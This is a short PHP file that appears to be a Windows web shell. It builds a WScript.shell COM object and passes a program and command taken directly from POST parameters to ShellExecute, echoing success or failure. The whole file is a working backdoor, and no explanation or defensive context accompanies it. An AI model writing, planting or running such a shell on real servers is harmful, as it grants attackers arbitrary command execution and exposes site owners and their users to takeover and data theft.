<?php
$shell = new COM("WScript.shell");
$run = $_POST['run'];
$cmd = $_POST['cmd'];
echo (@$shell->ShellExecute($run,'/c '.$cmd) == '0') ? '成功' : 'Faild'; 	
?>